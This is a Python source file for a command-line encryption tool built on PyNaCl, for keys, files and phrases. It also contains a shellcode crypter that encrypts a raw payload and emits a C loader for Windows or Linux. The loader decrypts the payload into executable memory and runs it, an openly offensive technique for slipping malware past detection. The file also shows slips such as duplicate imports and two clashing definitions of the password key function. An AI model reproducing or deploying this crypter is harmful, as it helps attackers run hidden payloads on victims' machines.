import nacl.secret
import nacl.utils
from nacl.pwhash import argon2id
from pathlib import Path
import parser
import os
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import nacl.secret
import nacl.utils

def read_file(filename: str) -> bytes:
    with open(filename, "rb") as file:
        return file.read()

def yes_no(prompt: str) -> bool:
    while True:
        answer = input(f"{prompt} (y/n): ").strip().lower()
        if answer == 'y':
            return True
        elif answer == 'n':
            return False
        else:
            print("Please enter 'y' or 'n'.")
            
def generate_key(ask_save_bool=False) -> bytes:
    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  # 32-byte key
    print(f"Generated key (hex): {key.hex()}")
    if ask_save_bool: ask_save(key.hex())  # Saving as hex for ease
    print(key)
    return key

def write_to_file(filename: str, data: str, mode = "a"):
    with open(filename, mode) as file:
        file.write(data)

def ask_overwrite(filename: str) -> bool:
    if Path(filename).exists():
        return yes_no(f"{filename} exists. Overwrite?")
    return True

def ask_save(data: str) -> None:
    if yes_no("Save to file?"):
        filename = input("Filename: ")
        if ask_overwrite(filename):
            write_to_file(filename, data, "w")

def encrypt_file(filename="", key="") -> bytes:
    if not key:
        if yes_no("Do you want to generate a key?"):
            key = generate_key()
        else:
            key = ask_key()
    
    while True:
        if not filename:
            filename = input("Filename: ")
        else:
            break
        if Path(filename).exists():
            break 
        print("File not found. Try again.")
        filename = ""
    
    with open(filename, "rb") as file:
        file_data = file.read()
    
    encrypted_file_data = encrypt_data(file_data, key)
    
    with open(f"{filename}.encrypted", "wb") as enc_file:
        enc_file.write(encrypted_file_data)
    print(f"Written to {filename}.encrypted\n")

    return encrypted_file_data

def bytes_to_c_array(data: bytes) -> str:
    c_array = ', '.join(f'0x{b:02x}' for b in data)
    return c_array

    

def ask_key() -> bytes:
    if yes_no("Generate key?"):
        return generate_key()
    if yes_no("Load key from file?"):
        while True:
            filename = input("Filename: ")
            if not Path(filename).exists():
                print("File doesn't exist.")
            else:
                key_hex = read_file(filename)
                try:
                    return bytes.fromhex(key_hex)
                except ValueError:
                    print("Invalid key format.")
                    break
    else:
        key_hex = input("Key (hex): ")
        while not valid_hex(key_hex):
            key_hex = input("Key (hex): ")
        return bytes.fromhex(key_hex)

def encrypt_data(data: bytes, key: bytes) -> bytes:
    box = nacl.secret.SecretBox(key)
    encrypted = box.encrypt(data)
    return encrypted

def decrypt_data(data: bytes, key: bytes, ask_save_bool=False) -> bytes:
    box = nacl.secret.SecretBox(key)
    try:
        decrypted = box.decrypt(data)
    except nacl.exceptions.CryptoError:
        print("Invalid data. Decryption failed.")
        return None
    print(f"Output: {decrypted.decode()}")
    if ask_save_bool: ask_save(decrypted.decode())
    return decrypted

def encrypt_phrase(phrase="", key="") -> bytes:
    phrase = phrase.encode("utf-8")
    if not key:
        key = ask_key()

    encrypted_data = encrypt_data(phrase, key)
    print(encrypted_data.hex())
    
    if yes_no("Save to file?"):
        filename = input("Filename: ")
        write_to_file(f"{filename}.encrypted", encrypted_data.hex(), "w")
    return encrypted_data

def decrypt_phrase(phrase="", key="", ask_save_bool=False) -> bytes:
    key = ask_key()
    encrypted_data = bytes.fromhex(input("Enter encrypted phrase (hex): "))
    decrypted_data = decrypt_data(encrypted_data, key, ask_save_bool)
    
    if yes_no("Save to file?"):
        filename = input("Filename: ")
        write_to_file(f"{filename}.decrypted", decrypted_data.decode(), "w")
    return decrypted_data

def generate_key_from_password(password="", salt=None, iterations: int = 100000) -> bytes:
    if not password:
        password = input("Password: ")
    if not salt:
        salt = nacl.utils.random(16)  # Generate random 16-byte salt
    key = argon2id.kdf(nacl.secret.SecretBox.KEY_SIZE, password.encode(), salt, opslimit=4, memlimit=1024*1024)
    print(key.hex())
    return key

def valid_hex(string: str) -> bool:
    try:
        bytes.fromhex(string)
        return True
    except ValueError:
        return False

def generate_salt(length=16):
    return os.urandom(length)

def generate_key_from_password(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def shellcode_c_crypter(shellcode_file="", key=""):
    if not key:
        key = generate_key()  # Ensure we have a key
    if not shellcode_file:
        shellcode_file = input("Filename (binary): ")

    encrypted_data = encrypt_file(shellcode_file, key)
    data_c_array = bytes_to_c_array(encrypted_data)
    key_c_array = bytes_to_c_array(key)

    c_template = create_c_template(data_c_array, key_c_array)
    
    write_to_file("shell.c", c_template, "w")
    print("C code has been written to shell.c")

def create_c_template(encrypted_data_array, key_array, platform=""):
    """Generate the C template code with the encrypted data and key."""
    template_windows = f"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sodium.h>
#include <windows.h>

int main() {{
    // Initialize libsodium
    if (sodium_init() < 0) {{
        return 1; // Panic
    }}

    // Define the encrypted data (including nonce and ciphertext)
    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
    unsigned int encrypted_data_len = sizeof(encrypted_data);

    // Key
    unsigned char key_bytes[] = {{ {key_array} }};

    // Extract nonce from the encrypted data (first 24 bytes)
    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);

    // Prepare to decrypt
    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
        // Decryption failed
        printf("Decryption failed!\\n");
        return 1;
    }}

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {{
        perror("VirtualAlloc");
        return 1;
    }}

    // Copy decrypted shellcode to executable memory
    memcpy(exec_mem, decrypted, sizeof(decrypted));

    // Execute shellcode
    void (*shellcode)() = (void(*)())exec_mem; // Cast the memory to a function pointer
    shellcode(); // Execute the shellcode

    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}}
"""

    template_linux = f"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sodium.h>
#include <sys/mman.h>

int main() {{
    // Initialize libsodium
    if (sodium_init() < 0) {{
        return 1; // Panic
    }}

    // Define the encrypted data (including nonce and ciphertext)
    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
    unsigned int encrypted_data_len = sizeof(encrypted_data);

    // Key
    unsigned char key_bytes[] = {{ {key_array} }};

    // Extract nonce from the encrypted data (first 24 bytes)
    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);

    // Prepare to decrypt
    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
        // Decryption failed
        printf("Decryption failed!\\n");
        return 1;
    }}

    // Allocate executable memory
    void *exec_mem = mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}

    // Copy decrypted shellcode to executable memory
    memcpy(exec_mem, decrypted, sizeof(decrypted));

    // Execute shellcode
    void (*shellcode)() = exec_mem; // Cast the memory to a function pointer
    shellcode(); // Execute the shellcode

    // Clean up
    munmap(exec_mem, sizeof(decrypted));
    
    return 0;
}}
"""
    if not platform:
        platform = input("Platform (windows/linux): ")
        
    if platform == "linux":
        return template_linux
    elif platform == "windows":
        return template_windows
    else:
        print("Invalid platform. (windows/linux). Defaulting to Windows")
        return template_windows



def main():
    parser.main()

if __name__ == "__main__":
    main()
